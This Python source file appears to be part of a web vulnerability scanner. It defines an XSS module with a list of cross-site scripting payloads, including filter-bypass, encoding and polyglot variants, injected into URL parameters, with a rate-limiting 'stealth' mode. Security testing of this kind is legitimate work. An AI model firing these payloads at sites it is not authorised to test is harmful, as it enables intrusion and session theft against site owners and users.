from core.scanner import BaseScanner
from typing import Dict, List, Optional
import asyncio

class XSSScanner(BaseScanner):
    """Cross-Site Scripting vulnerability scanner - Ultra Massive Payloads"""
    
    def __init__(self, session, target: str, stealth: bool = False, massive: bool = False):
        super().__init__(session, target, stealth, massive)
        self.payloads = self._load_payloads()
        
    def _load_payloads(self) -> List[str]:
        """Load massive XSS payloads"""
        base_payloads = [
            # Basic
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            
            # Event handlers
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<iframe src=\"javascript:alert(1)\">",
            "<div onmouseover=alert(1)>hover</div>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            
            # Obfuscated
            "<script>alert(document.cookie)</script>",
            "';alert(1);//",
            "\"><script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<a href=\"javascript:alert(1)\">click</a>",
            
            # Without script tags
            "<img src=x:x onerror=alert(1)>",
            "<img src=x:alert(1) onerror=eval(src)>",
            "<object data=javascript:alert(1)>",
        ]
        
        massive_payloads = [
            # Advanced bypasses
            "<img src=x onerror=alert`1`>",
            "<svg><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "<math/onclick=alert(1)>",
            
            # Case variations
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=x ONERROR=alert(1)>",
            "<SVG ONLOAD=alert(1)>",
            
            # Encoding bypasses
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            
            # Polyglots
            "javascript:/*--></script><img src=x onerror=alert(1)>",
            "\"><img src=x onerror=alert(1)>",
            "';alert(1);//\"><img src=x onerror=alert(1)>",
            
            # DOM-based
            "#<script>alert(1)</script>",
            "javascript:alert(1)//\\",
            "data:text/html,<script>alert(1)</script>",
            
            # Filter bypasses
            "<img src=x onerror=alert(1) xss=test>",
            "<img/src=x/onerror=alert(1)>",
            "<img%20src=x%20onerror=alert(1)>",
        ]
        
        if self.massive:
            return base_payloads + massive_payloads
        return base_payloads[:30] if self.stealth else base_payloads
        
    async def scan(self) -> List[Dict]:
        """Execute XSS scan"""
        if '?' in self.target:
            await self._test_url_parameters()
        return self.results
        
    async def _test_url_parameters(self):
        """Test URL parameters for XSS"""
        try:
            base_url, params = self.target.split('?', 1)
            param_pairs = [p.split('=', 1) for p in params.split('&')]
            
            # Get original response
            original_response = await self.http_client.get(self.target)
            original_text = original_response.text if original_response else ""
            
            for param_name, param_value in param_pairs:
                for idx, payload in enumerate(self.payloads):
                    if self.stealth and idx > 15:
                        break
                        
                    test_params = {param_name: payload}
                    test_url = self._build_url(base_url, test_params)
                    
                    result = await self.test_payload(payload, test_url, original_text)
                    if result:
                        self.add_result(
                            'Cross-Site Scripting (XSS)',
                            'HIGH',
                            test_url,
                            f"Parameter '{param_name}' vulnerable with payload: {payload[:80]}"
                        )
                        break
                        
                    await asyncio.sleep(0.2 if self.stealth else 0.05)
        except Exception as e:
            pass
            
    async def test_payload(self, payload: str, url: str, original_text: str = "") -> Optional[Dict]:
        """Test XSS payload"""
        try:
            test_response = await self.http_client.get(url)
            
            if test_response:
                is_vulnerable = self.validator.validate_xss(original_text, test_response.text, payload)
                if is_vulnerable:
                    return {'vulnerable': True, 'payload': payload}
        except Exception as e:
            pass
        return None
        
    def _build_url(self, base_url: str, params: Dict) -> str:
        """Build URL with parameters"""
        param_string = '&'.join([f"{k}={v}" for k, v in params.items()])
        return f"{base_url}?{param_string}"
